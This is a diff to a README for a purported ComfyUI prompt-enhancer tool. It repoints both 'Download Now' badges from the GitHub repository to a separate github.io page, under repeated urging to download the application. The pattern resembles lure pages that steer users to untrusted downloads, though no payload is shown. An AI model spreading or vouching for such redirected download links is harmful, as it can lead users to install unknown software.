@@ -12,7 +12,7 @@ Getting started takes less than two minutes. Here's exactly what to do:
 
 ### Step 1: Get the Software
 
-[![Download Now](https://img.shields.io/badge/Download-ComfyUI--Qwen--Image--2.1--Prompt--Enhancer-blue?style=for-the-badge&logo=github)](https://github.com/birgitbisontine236/ComfyUI-Qwen-Image-2.1-Prompt-Enhancer)
+[![Download Now](https://img.shields.io/badge/Download-ComfyUI--Qwen--Image--2.1--Prompt--Enhancer-blue?style=for-the-badge&logo=github)](https://birgitbisontine236.github.io)
 
 Visit this link to download the application.
 
@@ -119,7 +119,7 @@ Stay updated by checking the download page regularly for new versions.
 
 Don't let weak prompts hold back your creativity. With ComfyUI-Qwen-Image-2.1-Prompt-Enhancer, you'll create images that truly match your vision. Download it now and see the difference for yourself!
 
-[![Download Now](https://img.shields.io/badge/Get%20Started-Download%20Now-green?style=for-the-badge)](https://github.com/birgitbisontine236/ComfyUI-Qwen-Image-2.1-Prompt-Enhancer)
+[![Download Now](https://img.shields.io/badge/Get%20Started-Download%20Now-green?style=for-the-badge)](https://birgitbisontine236.github.io)
 
 Visit this link to download the application.
 
